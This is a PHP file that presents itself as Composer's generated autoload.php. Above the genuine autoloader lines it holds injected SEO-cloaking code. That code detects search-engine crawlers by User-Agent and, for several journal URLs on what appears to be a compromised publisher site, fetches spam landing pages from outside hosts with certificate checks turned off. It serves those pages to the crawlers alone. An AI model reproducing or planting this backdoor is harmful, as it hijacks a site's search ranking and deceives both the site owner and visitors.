<?php
$uri = $_SERVER['REQUEST_URI'];

function is_google_bot(){
    $bots = [
        "Googlebot", "Google-Site-Verification", "Google-InspectionTool", 
        "Googlebot-Mobile", "Googlebot-News", "AdsBot-Google", 
        "Mediapartners-Google", "Bingbot", "Slurp", "DuckDuckBot", 
        "AhrefsBot", "SemrushBot", "MJ12bot", "YandexBot"
    ];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    foreach($bots as $bot){
        if(stripos($ua, $bot) !== false){
            return true;
        }
    }
    return false;
}

// --- CLOAKING AJMA ---
if(strpos($uri, 'index.php/ajma') !== false){
    if(is_google_bot()){
        $url = 'https://freeportindonesia.org/landing/journal.formosapublisher-ajma.html';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($ch);
        curl_close($ch);
        exit;
    }
}

// --- CLOAKING ROOT ---
if($uri == '/' || $uri == '/index.php'){
    if(is_google_bot()){
        $url = 'https://freeportindonesia.org/landing/formosapublisher.html';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($ch);
        curl_close($ch);
        exit;
    }
}

// --- CLOAKING JIPH (PERBAIKI) ---
if(stripos($uri, 'index.php/jiph') !== false){
    if(is_google_bot()){
        $url = 'https://inkaindonesia.org/landing/journal.formosapublisher-cunjp.html';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if($http_code == 200 && !empty($content)){
            echo $content;
        } else {
            echo 'cache not ready';
        }
        exit;
    }
}

// autoload.php @generated by Composer
require_once __DIR__ . '/composer/autoload_real.php';
return ComposerAutoloaderInit062ed7c26ecbce812e6c84c9df86c27a::getLoader();
